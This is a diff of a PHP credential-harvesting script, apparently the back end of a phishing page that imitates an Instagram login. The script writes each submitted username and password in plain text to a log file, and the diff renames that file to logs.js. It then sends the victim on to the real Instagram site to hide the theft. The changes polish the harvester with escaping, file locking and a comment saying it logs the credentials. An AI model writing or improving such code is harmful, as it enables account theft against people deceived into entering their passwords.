@@ -1,12 +1,16 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    $username = $_POST['username'];
-    $password = $_POST['password'];
+    $username = htmlspecialchars($_POST['username']);
+    $password = htmlspecialchars($_POST['password']);
 
-    $log = "Username: " . $username . " | Password: " . $password . "\n";
-    file_put_contents('logs.txt', $log, FILE_APPEND);
+    // Log the credentials to a file
+    $log = "Username: $username | Password: $password" . PHP_EOL;
+    file_put_contents('logs.js', $log, FILE_APPEND | LOCK_EX);
 
-    header('Location: https://instagram.com');
+    // Redirect to a fake success page or Instagram
+    header('Location: https://www.instagram.com');
     exit();
+} else {
+    echo "Invalid Request";
 }
 ?>
